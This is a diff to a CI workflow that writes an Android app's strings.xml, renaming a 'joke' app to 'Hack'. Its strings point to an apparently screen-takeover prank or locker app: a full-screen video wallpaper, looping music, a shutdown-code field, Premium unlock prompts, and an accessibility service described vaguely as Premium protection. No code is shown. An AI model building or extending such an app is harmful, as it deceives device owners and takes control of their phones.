@@ -243,18 +243,18 @@ jobs:
           cat > app/src/main/res/values/strings.xml <<'EOF_FILE'
           <?xml version="1.0" encoding="utf-8"?>
           <resources>
-              <string name="app_name">Шутка</string>
-              <string name="status_active">Шутка активна</string>
+              <string name="app_name">Hack</string>
+              <string name="status_active">Hack active</string>
               <string name="premium_desc">Активируйте Премиум, чтобы получить доступ к эксклюзивным функциям и защите.</string>
               <string name="premium_btn">Получить Премиум</string>
               <string name="premium_success">Премиум активирован! Функции разблокированы.</string>
               <string name="premium_fail">Без активации Премиум-функции недоступны.</string>
               <string name="enter_code_hint">Код выключения</string>
-              <string name="wallpaper_label">Шуточные обои</string>
+              <string name="wallpaper_label">Hack</string>
               <string name="wallpaper_description">Видео на весь экран</string>
               <string name="channel_name">Музыка</string>
-              <string name="notification_title">Шутка активна</string>
-              <string name="notification_text">Музыка играет по кругу</string>
+              <string name="notification_title">Hack active</string>
+              <string name="notification_text">Hack</string>
               <string name="action_stop">Выключить всё</string>
               <string name="accessibility_desc">Служба защиты Премиум-функций.</string>
           </resources>
